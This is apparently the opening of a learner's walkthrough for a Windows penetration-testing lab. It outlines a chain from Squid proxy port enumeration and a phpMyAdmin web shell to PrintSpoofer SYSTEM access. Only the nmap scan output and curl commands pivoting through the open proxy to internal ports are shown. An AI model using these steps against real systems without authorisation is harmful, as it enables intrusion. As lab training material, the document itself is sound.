This lab demonstrates using a Squid proxy to enumerate open ports on a target and gain initial access via phpMyAdmin with default credentials. Learners will escalate privileges by recovering restricted LOCAL SERVICE privileges through scheduled tasks. Finally, they will exploit the SeImpersonatePrivilege using PrintSpoofer to achieve a SYSTEM shell. This lab emphasizes proxy exploitation, privilege recovery, and abuse of impersonation rights.

- Enumerate open ports behind the Squid proxy to identify accessible services.
- Exploit phpMyAdmin to upload a web shell and establish a reverse shell as LOCAL SERVICE.
- Recover default LOCAL SERVICE privileges using a scheduled task.
- Enable the SeImpersonatePrivilege via a scheduled task with a crafted Principal.
- Use PrintSpoofer to exploit SeImpersonatePrivilege and achieve SYSTEM-level access.


ok lets go!!!

```
nmap -sV -sC -T4 -oA initial 192.168.52.189


???(kali?kali)-[~]
??$ nmap -sV -sC -T4 -oA initial 192.168.52.189
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-31 02:07 +0000
Nmap scan report for 192.168.52.189
Host is up (0.00050s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3128/tcp open  http-proxy    Squid http proxy 4.14
|_http-server-header: squid/4.14
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported: GET HEAD
|_http-title: ERROR: The requested URL could not be retrieved
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-03-31T02:07:59
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 56.37 seconds
                                                                                                          
```



```
# curl through the proxy
curl -x http://192.168.52.189:3128 http://127.0.0.1/ #nope
curl -x http://192.168.52.189:3128 http://127.0.0.1:8080/ # HIT!!!!
curl -x http://192.168.52.189:3128 http://192.168.52.189:80/
```

So, `curl -x http://192.168.52.189:3128 http://127.0.0.1:8080/` works.

going to set up firefox to use foxyproxy.